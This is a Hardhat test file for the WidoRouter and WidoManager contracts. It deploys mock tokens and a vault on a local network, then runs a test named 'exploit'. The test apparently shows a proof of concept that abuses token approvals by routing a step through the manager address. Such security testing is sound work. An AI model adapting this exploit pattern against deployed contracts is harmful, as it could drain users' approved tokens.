//import {expect} from "./setup/chai-setup";

import {ethers, deployments, getUnnamedAccounts} from "hardhat";
import {ERC20, WidoManager, WidoManager__factory, WidoRouter} from "../typechain";
import {IWidoRouter} from "../typechain/contracts/WidoRouter";
import {loadFixture} from "ethereum-waffle";
import {MockERC20} from "../typechain/contracts/mock/MockERC20";
import {WETH} from "../typechain/contracts/mock/WETH";
import {SignerWithAddress} from "@nomiclabs/hardhat-ethers/signers";
import {MockVault} from "../typechain/contracts/mock/MockVault";

async function deployFixture() {
  const [_deployer, _user1, _user2, _bank] = await ethers.getSigners();

  const WETH = await ethers.getContractFactory("WETH");
  const _weth = (await WETH.connect(_deployer).deploy()) as WETH;

  const Router = await ethers.getContractFactory("WidoRouter");
  const _router = (await Router.connect(_deployer).deploy(_weth.address, _bank.address)) as WidoRouter;

  const _manager = (await ethers.getContractAt(WidoManager__factory.abi, await _router.widoManager())) as WidoManager;

  const ERC20 = await ethers.getContractFactory("MockERC20");
  const _token1 = (await ERC20.connect(_deployer).deploy()) as MockERC20;
  const _token2 = (await ERC20.connect(_deployer).deploy()) as MockERC20;

  const Vault = await ethers.getContractFactory("MockVault");
  const _vault = (await Vault.connect(_deployer).deploy(_token1.address)) as MockVault;

  return {_router, _manager, _token1, _token2, _vault, _deployer, _user1, _user2};
}

const executeOrderFn =
  "executeOrder((address,address,address,uint256,uint256,uint32,uint32),(address,address,address,bytes,int32)[],uint256,address)";

describe(`WidoManager`, async () => {
  let router: WidoRouter,
    manager: WidoManager,
    token1: MockERC20,
    token2: MockERC20,
    vault: MockVault,
    deployer: SignerWithAddress,
    user1: SignerWithAddress,
    user2: SignerWithAddress;

  beforeEach(async function () {
    const {_router, _manager, _token1, _token2, _vault, _deployer, _user1, _user2} = await loadFixture(deployFixture);

    router = _router;
    manager = _manager;
    token1 = _token1;
    token2 = _token2;
    vault = _vault;
    deployer = _deployer;
    user1 = _user1;
    user2 = _user2;
  });

  it(`exploit`, async function () {
    const amount = ethers.utils.parseUnits("1", 18);

    await token1.connect(user1).freeMint(amount);
    await token1.connect(user2).freeMint(amount);
    await token2.connect(user1).freeMint(amount);
    await token2.connect(user2).freeMint(amount);

    await token1.connect(user1).approve(manager.address, ethers.constants.MaxUint256.toString());
    await token1.connect(user2).approve(router.address, ethers.constants.MaxUint256.toString());

    const data = vault.interface.encodeFunctionData("deposit", [amount]);

    const swapRoute: IWidoRouter.StepStruct[] = [
      {fromToken: token1.address, toToken: manager.address, targetAddress: vault.address, data, amountIndex: 4},
    ];

    console.log("manager add", manager.address);

    const order: IWidoRouter.OrderStruct = {
      user: user1.address,
      fromToken: token1.address,
      toToken: vault.address,
      fromTokenAmount: amount,
      minToTokenAmount: "1",
      nonce: 0,
      expiration: 0,
    };

    await router.connect(user1).functions[executeOrderFn](order, swapRoute, 0, ethers.constants.AddressZero);
  });
});
